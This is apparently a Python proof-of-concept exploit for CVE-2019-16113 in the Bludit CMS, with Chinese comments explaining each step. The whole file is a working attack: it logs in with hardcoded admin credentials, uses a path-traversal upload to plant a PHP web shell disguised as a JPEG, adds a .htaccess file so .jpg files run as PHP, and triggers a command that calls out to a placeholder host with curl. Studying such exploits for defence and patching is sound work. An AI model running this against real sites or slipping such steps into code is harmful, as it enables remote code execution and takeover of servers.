#!/usr/bin/env python
#encoding:utf-8
import requests
import re

# PoC by @hg8
# FROM:https://github.com/hg8/CVE-2019-16113-PoC
# Credit: @christasa
# https://github.com/bludit/bludit/issues/1081

url = "http://bludit"
user = "admin"
password = "dxy0411"
cmd = "curl http://poc/asdf"


def admin_login():
    s = requests.Session()
    # requests库的session对象能够帮我们跨请求保持某些参数，也会在同一个session实例发出的所有请求之间保持cookies
    login_page = s.get("{}/admin/".format(url))
    # print(re.search('"tokenCSRF".+?value="(.+?)"', login_page.text))
    csrf_token = re.search('"tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    data = {
        "username": user,
        "password": password,
        "tokenCSRF": csrf_token
    }

    r = s.post("{}/admin/".format(url), data, allow_redirects=False)
    # 禁止重定向
    if r.status_code != 301:
        print("[!] Username or password incorrect.")
        exit()

    print("[+] Loggin successful.")
    return s


def get_csrf(s):
    r = s.get("{}/admin/".format(url))
    csrf_token = r.text.split('var tokenCSRF = "')[1].split('"')[0]
    print("[+] Token CSRF: {}".format(csrf_token))
    return csrf_token


def upload_shell(s, csrf_token):
    data = {
        "uuid": "../../tmp",
        "tokenCSRF": csrf_token
    }
    multipart = [('images[]', ("attack.jpg", "<?php shell_exec(\"cat .htaccess;" + cmd + "\");?>", 'image/gif'))]

    r = s.post("{}/admin/ajax/upload-images".format(url), data, files=multipart)

    if r.status_code != 200:
        print("[!] Error uploading Shell.")
        print("[!] Make sure Bludit version >= 3.9.2.")

    print("[+] Shell upload succesful.")

    multipart_htaccess = [('images[]', ('.htaccess', "RewriteEngine off\r\nAddType application/x-httpd-php .jpg", 'image/jpeg'))]
    # AddType application/x-httpd-php .jpg	#将.jpg后缀的文件作为PHP文件解析
    # 上传.htaccess文件到upload目录时，upload目录下的文件会按其配置生效解析
    r = s.post(url + "/admin/ajax/upload-images", data, files=multipart_htaccess)

    if r.status_code != 200:
        print("[!] Error uploading .htaccess.")
        print("[!] Make sure Bludit version >= 3.9.2.")

    print("[+] .htaccess upload succesful.")


def execute_cmd(s):
    try:
        r = s.get("{}/bl-content/tmp/attack.jpg".format(url), timeout=1)
    except requests.exceptions.ReadTimeout:
        pass
    print("[+] Command Execution Successful.")


if __name__ == '__main__':
    session = admin_login()
    csrf_token = get_csrf(session)
    upload_shell(session, csrf_token)
    execute_cmd(session)
